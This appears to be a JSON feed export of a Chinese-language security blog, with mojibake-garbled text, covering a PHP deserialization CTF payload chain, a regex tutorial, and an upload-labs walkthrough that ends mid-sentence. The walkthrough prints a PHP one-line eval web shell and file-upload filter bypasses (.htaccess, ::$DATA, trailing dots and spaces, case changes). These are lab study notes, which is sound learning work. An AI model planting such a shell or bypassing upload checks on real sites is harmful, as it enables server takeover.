class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$object</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"title function_ invoke__\">array_walk</span>(<span class=\"variable\">$this</span>, function(<span class=\"variable\">$fn</span>, <span class=\"variable\">$prev</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable\">$fn</span>[<span class=\"number\">0</span>] === <span class=\"string\">&quot;system&quot;</span> &amp;&amp; <span class=\"variable\">$prev</span> === <span class=\"string\">&quot;ls&quot;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"title function_ invoke__\">add</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"keyword\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">protected</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;<span class=\"comment\">#ç¬¬ä¸‰æ­¥,æ„é€ äº†construct,åŸå› è§ä¸Š</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;b::construct&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;filename=<span class=\"keyword\">new</span> a;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;filename-&gt;<span class=\"keyword\">object</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">c</span>([<span class=\"string\">&#x27;string&#x27;</span>=&gt;[<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">a</span>(),<span class=\"string\">&#x27;resolve&#x27;</span>]]);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"comment\">//$this-&gt;filename-&gt;object=new c;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addMe</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"string\">&quot;Add Failed. Filename:&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$args</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"title function_ invoke__\">call_user_func</span>([<span class=\"variable\">$this</span>, <span class=\"variable\">$func</span>.<span class=\"string\">&quot;Me&quot;</span>], <span class=\"variable\">$args</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">c</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">private</span> <span class=\"variable\">$string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">string</span> = <span class=\"variable\">$string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"comment\">#$name=&#x27;string&#x27;çš„å€¼,varå’Œnameæ˜¯ç›¸ç­‰çš„,ä¼ å…¥ä¸€ä¸ªæ•°ç»„æ˜¯å› ä¸ºåé¢ç”¨çš„æ•°ç»„å¤„ç†æ–¹å¼,new a()ç›¸ç­‰ä¸é”®å,ä¹Ÿå°±æ˜¯$var,resolveå°±æ˜¯é”®å€¼,ç›¸å½“äº$name</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$var</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$var</span>[<span class=\"variable\">$name</span>]();</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$q</span>=<span class=\"keyword\">new</span> a;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$q</span>-&gt;<span class=\"keyword\">object</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">b</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$q</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$q</span>));</span><br></pre></td></tr></table></figure>\n<p>ä¸åŠ  url ç¼–ç çš„ payload è¦å†ä¿æŠ¤ç§æœ‰å˜é‡ååŠ  %00,url ç¼–ç çš„åˆ™å¯ä»¥ç›´æ¥ç”¨</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/",
            "url": "https://hq185187.github.io/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/",
            "title": "æ­£åˆ™è¡¨è¾¾å¼",
            "date_published": "2023-04-27T10:41:31.571Z",
            "content_html": "<h2>è¯­æ³•</h2>\n<p>runoo+b,å¯ä»¥åŒ¹é…runoob,runooob,runoooooobç­‰,+å·ä»£è¡¨å‰é¢çš„å­—ç¬¦è‡³å°‘å‡ºç°ä¸€æ¬¡(ä¸€æ¬¡æˆ–è€…å¤šæ¬¡)</p>\n<p>runoob*b,å¯ä»¥åŒ¹é…runob,runoob,runooooob,*å·ä»£è¡¨*å‰é¢çš„å­—ç¬¦å¯ä»¥ä¸å‡ºç°,ä¹Ÿå¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–è€…å¤šæ¬¡</p>\n<p>colou?rå¯ä»¥åŒ¹é…color,colour,?ä»£è¡¨å‰é¢çš„å­—ç¬¦æœ€å¤šå¯ä»¥å‡ºç°ä¸€æ¬¡(<strong>0æ¬¡æˆ–è€…ä¸€æ¬¡</strong>)</p>\n<h2>æ™®é€šå­—ç¬¦</h2>\n<li>[ABC],ä¼šåŒ¹é…[...]ä¸­çš„æ‰€æœ‰å­—ç¬¦</li>\n<li>[^ABC],ä¼šåŒ¹é…é™¤äº†[...]ä¸­çš„æ‰€æœ‰å­—ç¬¦</li>\n<li>[A-Z],è¡¨ç¤ºä¸€ä¸ªåŒºé—´ä¼šåŒ¹é…æ‰€æœ‰å¤§å†™å­—æ¯</li>\n<li>/./åŒ¹é…é™¤æ¢è¡Œç¬¦ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦</li>\n<li>[\\s\\S]åŒ¹é…æ‰€æœ‰,\\såŒ¹é…æ‰€æœ‰ç©ºç™½ç¬¦,åŒ…æ‹¬æ¢è¡Œ,\\Séç©ºç™½ç¬¦,ä¸åŒ…æ‹¬æ¢è¡Œ</li>\n<li>\\wåŒ¹é…å­—ç¬¦æ•°å­—ä¸‹åˆ’çº¿,ç­‰ä»·äº[A-Za-z0-9_]</li>\n<li>$åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾ä½ç½®</li>\n<li>{n},næ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°,åŒ¹é…ç¡®å®šçš„næ¬¡,eg.o{2}ä¸èƒ½åŒ¹é…\"Bob\"ä¸­çš„o,ä½†æ˜¯èƒ½åŒ¹é…\"food\"ä¸­çš„ä¸¤ä¸ªo</li>\n<li>{n,},è‡³å°‘åŒ¹é…næ¬¡,o{2,}ä¸èƒ½åŒ¹é…\"Bob\"ä¸­çš„o,ä½†èƒ½åŒ¹é…\"fooood\"ä¸­çš„æ‰€æœ‰çš„o,o{1,}ç­‰ä»·o+,o{0,}ç­‰ä»·o*</li>\n<h3>å®šä½ç¬¦</h3>\n<li>^åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²å¼€å§‹çš„åœ°æ–¹</li>\n<li>$åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²ç»“å°¾çš„åœ°æ–¹</li>\n<li>\\båŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œ</li>\n<li>\\BåŒ¹é…éå•è¯è¾¹ç•Œ</li>\n<li>\\dåŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦</li>\n<li>\\DåŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦</li>\n<li>\\fåŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦</li>\n<h3>ä¿®é¥°ç¬¦</h3>\n/pattern/i ä¸åŒºåˆ†å¤§å°å†™\n/pattern/g å…¨å±€åŒ¹é…,æŸ¥æ‰¾æ‰€æœ‰çš„åŒ¹é…é¡¹\n/pattern/m å¤šè¡ŒåŒ¹é…,ä½¿è¾¹ç•Œå­—ç¬¦^å’Œ$åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´å’Œç»“å°¾\n/pattern/s ä½¿ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹.ä¸­åŒ…å«æ¢è¡Œç¬¦<code>\\n</code>\n<p>æ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸé™¤äº† /â€¦/ è¿˜å¯ä»¥ç”¨ @â€¦@</p>\n<h2>1.preg_match()</h2>\næ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…\n<code>int preg_match(string $pattern,string $subject[, array &$matches [, int $flags = 0 [, int $offset = 0 ]]])</code>\n$patternæ˜¯è¦æœç´¢çš„æ¨¡å¼,å­—ç¬¦ä¸²å½¢å¼\n$subjectæ˜¯è¾“å…¥å­—ç¬¦ä¸²\n$match:å¦‚æœæä¾›æ­¤å‚æ•°,å®ƒå°†è¢«å¡«å……ä¸ºæœç´¢ç»“æœ,$matchs[0]å°†åŒ…å«å®Œæ•´æ¨¡å¼åŒ¹é…çš„æ–‡æœ¬,$match[1]å°†åŒ…å«ç¬¬ä¸€ä¸ªæ•è·å­ç»„åŒ¹é…åˆ°çš„æ–‡æœ¬\nè¿”å›å€¼å°†æ˜¯0æˆ–è€…1,å› ä¸ºpreg_matchåœ¨åŒ¹é…ä¸€æ¬¡åå°†ä¼šè‡ªåŠ¨åœæ­¢æœç´¢\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/",
            "url": "https://hq185187.github.io/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/",
            "title": "upload-labsé¶åœº",
            "date_published": "2023-04-27T09:53:21.634Z",
            "content_html": "<h3 id=\"ç¬¬ä¸€é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸€é¢˜\">#</a> ç¬¬ä¸€é¢˜</h3>\n<p>ä¸€å¥è¯æœ¨é©¬</p>\n<p>phpinfo();<br>\n@eval($_POST[â€˜zoeâ€™]);<br>\n?&gt;</p>\n<p>1. å°† php åç¼€æ”¹æˆ png/gif ç­‰ç¬¦åˆæ¡ä»¶çš„åç¼€ä¸Šä¼ æŠ“åŒ…ï¼Œå°†åç¼€æ”¹æˆ php æ”¾åŒ…å³å¯æˆåŠŸä¸Šä¼ <br>\nç”¨èšå‰‘æ·»åŠ æ•°æ®<br>\n 2.F12-&gt; è°ƒè¯•å™¨ -&gt; è®¾ç½®é‡Œç¦ç”¨ js<br>\n3. å¤åˆ¶ç½‘é¡µæºä»£ç ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œåˆ æ‰é‡Œé¢çš„ js éƒ¨åˆ†ï¼Œæ·»åŠ  action éƒ¨åˆ†ï¼Œæ‰“å¼€å³å¯</p>\n<h3 id=\"ç¬¬äºŒé¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬äºŒé¢˜\">#</a> ç¬¬äºŒé¢˜</h3>\n<p>MIME ç±»å‹<br>\næŠ“åŒ…æ”¹ content-type ä¸ºç¬¦åˆæ¡ä»¶çš„å°±è¡Œ<br>\n eg.image-png</p>\n<h3 id=\"ç¬¬ä¸‰é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸‰é¢˜\">#</a> ç¬¬ä¸‰é¢˜</h3>\n<p>é»‘åå•ç±»å‹ - ä¿®æ”¹åç¼€ç»•è¿‡</p>\n<ul>\n<li>ç”¨é»‘åå•ä¸å…è®¸ä¸Šä¼  <code>.asp,.aspx,.php,.jsp</code>  åç¼€çš„æ–‡ä»¶</li>\n<li>ä½†å¯ä»¥ä¸Šä¼  <code>.phtml .phps .php5 .pht</code></li>\n<li><mark>é¦–é€‰ phtml</mark></li>\n<li>å‰ææ˜¯ apache çš„ httpd.conf ä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç </li>\n<li>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</li>\n</ul>\n<h3 id=\"ç¬¬å››é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬å››é¢˜\">#</a> ç¬¬å››é¢˜</h3>\n<p>.htaccess<br>\n å…ˆå°† httpd.conf çš„æ–‡ä»¶ä¸­çš„ AllowOverride none æ”¹ä¸º ALL<br>\n1 <code>AddType application/x-httpd-php .jpg</code> Â è¿™ä¸ªæŒ‡ä»¤ä»£è¡¨ç€ <code>.jpg</code>  æ–‡ä»¶ä¼šå½“åš <code>php</code>  æ¥è§£æ<br>\nä¼ ä¸ª zoe.jpg</p>\n<p>2 <code>SetHandler application/x-httpd-php</code> ï¼Œæ„æ€æ˜¯æŠŠæ‰€æœ‰æ–‡ä»¶éƒ½è§£æä¸º <code>php</code>  æ–‡ä»¶æ¥æ‰§è¡Œã€‚<br>\nå†™ç¬¬äºŒä¸ªå‘½åä¸º.htaccess ä¼ ä¸Šå»<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS16b2UtaTY4ZHo3Yi54eHg=\">ä¼ ä¸ª zoe.xxx</span>, éšä¾¿ä»€ä¹ˆåç¼€ç¬¦åˆè¦æ±‚å°±è¡Œ</p>\n<p>3. å¯ä»¥ç”¨ç¬¬åé¢˜çš„è§£æ³•ï¼Œåˆ©ç”¨ deldot çš„æ¼æ´</p>\n<p>è¡¥å……ï¼š(åŸæœ¬å¤šå‡ºçš„ç¬¬äº”é¢˜)<br>\n åœ¨ Windows æ“ä½œç³»ç»Ÿä¸­ï¼Œxx.jpg. å’Œ xx.jpg ç©ºæ ¼éƒ½ç›¸å½“äº xx.jpg, è‡ªåŠ¨å»æ‰äº†æœ«å°¾çš„ã€‚å’Œç©ºæ ¼<br>\nåç¼€åå¯ä»¥æ˜¯ zoe.php. .</p>\n<h3 id=\"ç¬¬å…­é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬å…­é¢˜\">#</a> ç¬¬å…­é¢˜</h3>\n<p>æ­¤é¢˜çš„æºç å¯ä»¥å‘ç°å°‘äº† strtolower å‡½æ•°<br>\né»‘åå•ä¹‹å¤§å°å†™ç»•è¿‡<br>\nå°†åç¼€æ”¹æˆ Php å³å¯</p>\n<h3 id=\"ç¬¬ä¸ƒé¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸ƒé¢˜\">#</a> ç¬¬ä¸ƒé¢˜</h3>\n<p>é»‘åå•éªŒè¯ä¹‹ç©ºæ ¼ç»•è¿‡<br>\nè¿™ä¸€å…³é»‘åå•ï¼Œæ²¡æœ‰ä½¿ç”¨ trim () å»é™¤ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨ç©ºæ ¼ç»•è¿‡é»‘åå•<br>\n bp æŠ“åŒ…åœ¨ content-disposition ä¸­ php ååŠ ä¸ªç©ºæ ¼</p>\n<h3 id=\"ç¬¬å…«é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬å…«é¢˜\">#</a> ç¬¬å…«é¢˜</h3>\n<p>è¿™ä¸€å…³é»‘åå•ï¼Œæ²¡æœ‰ä½¿ç”¨ deldot () è¿‡æ»¤æ–‡ä»¶åæœ«å°¾çš„ <code>ç‚¹</code> ï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶åååŠ ã€‚è¿›è¡Œç»•è¿‡<br>\næŠ“åŒ…ä¿®æ”¹    .php. æ³¨æ„è¿™é‡Œæœ‰ä¸ª.</p>\n<h3 id=\"ç¬¬ä¹é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¹é¢˜\">#</a> ç¬¬ä¹é¢˜</h3>\n<p>ç‰¹æ®Šå­—ç¬¦::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>ç»•è¿‡è¡¥å……çŸ¥è¯†ï¼š</mtext><mi>p</mi><mi>h</mi><mi>p</mi><mtext>åœ¨</mtext><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mtext>çš„æ—¶å€™å¦‚æœæ–‡ä»¶å</mtext><mo>+</mo><mi mathvariant=\"normal\">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding=\"application/x-tex\">DATAç»•è¿‡\nè¡¥å……çŸ¥è¯†ï¼šphpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+&quot;::</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">ç»•</span><span class=\"mord cjk_fallback\">è¿‡</span><span class=\"mord cjk_fallback\">è¡¥</span><span class=\"mord cjk_fallback\">å……</span><span class=\"mord cjk_fallback\">çŸ¥</span><span class=\"mord cjk_fallback\">è¯†</span><span class=\"mord cjk_fallback\">ï¼š</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mord cjk_fallback\">åœ¨</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord cjk_fallback\">çš„</span><span class=\"mord cjk_fallback\">æ—¶</span><span class=\"mord cjk_fallback\">å€™</span><span class=\"mord cjk_fallback\">å¦‚</span><span class=\"mord cjk_fallback\">æœ</span><span class=\"mord cjk_fallback\">æ–‡</span><span class=\"mord cjk_fallback\">ä»¶</span><span class=\"mord cjk_fallback\">å</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mrel\">:</span></span></span></span>DATA&quot; ä¼šæŠŠ::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†</mtext><mo separator=\"true\">,</mo><mtext>ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ</mtext><mi mathvariant=\"normal\">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding=\"application/x-tex\">DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ&quot;::</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">ä¹‹</span><span class=\"mord cjk_fallback\">å</span><span class=\"mord cjk_fallback\">çš„</span><span class=\"mord cjk_fallback\">æ•°</span><span class=\"mord cjk_fallback\">æ®</span><span class=\"mord cjk_fallback\">å½“</span><span class=\"mord cjk_fallback\">æˆ</span><span class=\"mord cjk_fallback\">æ–‡</span><span class=\"mord cjk_fallback\">ä»¶</span><span class=\"mord cjk_fallback\">æµ</span><span class=\"mord cjk_fallback\">å¤„</span><span class=\"mord cjk_fallback\">ç†</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">ä¸</span><span class=\"mord cjk_fallback\">ä¼š</span><span class=\"mord cjk_fallback\">æ£€</span><span class=\"mord cjk_fallback\">æµ‹</span><span class=\"mord cjk_fallback\">å</span><span class=\"mord cjk_fallback\">ç¼€</span><span class=\"mord cjk_fallback\">å</span><span class=\"mord cjk_fallback\">ï¼Œ</span><span class=\"mord cjk_fallback\">ä¸”</span><span class=\"mord cjk_fallback\">ä¿</span><span class=\"mord cjk_fallback\">æŒ</span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mrel\">:</span></span></span></span>DATA&quot; ä¹‹å‰çš„æ–‡ä»¶å ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€åã€‚<br>\næŠ“åŒ…æ”¹åç¼€ï¼Œphp::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>æµè§ˆå™¨åœ°å€å»æ‰</mtext><mo>:</mo><mo>:</mo></mrow><annotation encoding=\"application/x-tex\">DATA\næµè§ˆå™¨åœ°å€å»æ‰::</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">æµ</span><span class=\"mord cjk_fallback\">è§ˆ</span><span class=\"mord cjk_fallback\">å™¨</span><span class=\"mord cjk_fallback\">åœ°</span><span class=\"mord cjk_fallback\">å€</span><span class=\"mord cjk_fallback\">å»</span><span class=\"mord cjk_fallback\">æ‰</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mrel\">:</span></span></span></span>data å°±å¯ä»¥æ­£å¸¸è¿æ¥</p>\n<h3 id=\"ç¬¬åé¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬åé¢˜\">#</a> ç¬¬åé¢˜</h3>\n<p>è¿™ä¸€å…³é»‘åå•ï¼Œæœ€åä¸Šä¼ è·¯å¾„ç›´æ¥ä½¿ç”¨æ–‡ä»¶åè¿›è¡Œæ‹¼æ¥ï¼Œè€Œä¸”åªå¯¹æ–‡ä»¶åè¿›è¡Œ<br>\n f i l e n a m e = d e l d o t (file_name) æ“ä½œå»é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œæ„é€ åç¼€ç»•è¿‡é»‘åå•<br>\nè¡¥å……çŸ¥è¯†ï¼šdeldot () å‡½æ•°ä»åå‘å‰æ£€æµ‹ï¼Œå½“æ£€æµ‹åˆ°æœ«å°¾çš„ç¬¬ä¸€ä¸ªç‚¹æ—¶ä¼šç»§ç»­å®ƒçš„æ£€æµ‹ï¼Œä½†æ˜¯é‡åˆ°ç©ºæ ¼ä¼šåœä¸‹æ¥<br>\nä¸Šä¼  zoe.php ç„¶åç”¨ bp æ”¹åç¼€åŠ ç‚¹ == <code>ç©ºæ ¼ç‚¹</code>  ==ï¼ˆå³æ–‡ä»¶åä¸º <code>zoe.php. .</code> ï¼‰</p>\n<p>ä½¿ç”¨ antsword è¿æ¥   <mark>.php.</mark></p>\n<p>åä¸€.<br>\n åŒå†™ç»•è¿‡<br>\nè¿™ä¸€å…³é»‘åå•ï¼Œä½¿ç”¨ str_ireplace () 